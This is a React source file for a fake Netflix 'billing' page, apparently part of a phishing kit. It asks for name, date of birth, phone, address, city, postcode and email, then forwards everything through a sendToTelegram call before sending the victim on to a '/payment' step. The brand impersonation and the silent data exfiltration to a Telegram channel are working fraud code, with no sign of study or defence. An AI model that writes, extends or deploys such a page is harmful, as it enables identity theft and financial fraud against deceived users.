import React, { useState } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { sendToTelegram } from '../services/telegram';
import { motion } from 'framer-motion';

export function BillingPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    dob: '',
    phone: '',
    address: '',
    city: '',
    zip: '',
    email: location.state?.email || ''
  });

  const handleDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 8) {
      value = value.slice(0, 8);
    }
    if (value.length >= 4) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
    } else if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    setFormData({ ...formData, dob: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram({
      type: 'billing',
      ...formData
    });
    navigate('/payment', {
      state: {
        billingInfo: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          address: formData.address,
          postalCode: formData.zip,
          phone: formData.phone,
          email: formData.email
        }
      }
    });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="border-b border-gray-200"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.2 }}
          className="w-full max-w-[440px]"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.3 }}
            className="mb-8"
          >
            <span className="block text-sm text-[#737373] mb-1">
              {intl.formatMessage({ id: 'step.of' }, { current: 1, total: 3 })}
            </span>
            <h1 className="text-[32px] font-medium text-[#333333] font-bold">
              {intl.formatMessage({ id: 'billing.title' })}
            </h1>
          </motion.div>

          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.4 }}
            className="text-sm text-[#333333] mb-8"
          >
            {intl.formatMessage({ id: 'billing.subtitle' })}
          </motion.p>

          <motion.form
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.5 }}
            onSubmit={handleSubmit}
            className="space-y-4"
          >
            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.firstname' })}
              </label>
              <input
                required
                type="text"
                value={formData.firstName}
                onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.lastname' })}
              </label>
              <input
                required
                type="text"
                value={formData.lastName}
                onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.dob' })}
              </label>
              <input
                required
                type="text"
                placeholder="JJ/MM/AAAA"
                maxLength={10}
                value={formData.dob}
                onChange={handleDateInput}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.phone' })}
              </label>
              <input
                required
                type="tel"
                value={formData.phone}
                onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.address' })}
              </label>
              <input
                required
                type="text"
                value={formData.address}
                onChange={(e) => setFormData({ ...formData, address: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.city' })}
              </label>
              <input
                required
                type="text"
                value={formData.city}
                onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'billing.zip' })}
              </label>
              <input
                required
                type="text"
                maxLength={5}
                pattern="[0-9]*"
                value={formData.zip}
                onChange={(e) => setFormData({ ...formData, zip: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <motion.button 
              type="submit"
              className="w-full text-white bg-[#e50914] rounded px-8 py-4 text-lg font-medium hover:bg-[#f6121d] transition-all transform hover:scale-[1.02] mt-8"
            >
              {intl.formatMessage({ id: 'billing.continue' })}
            </motion.button>
          </motion.form>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}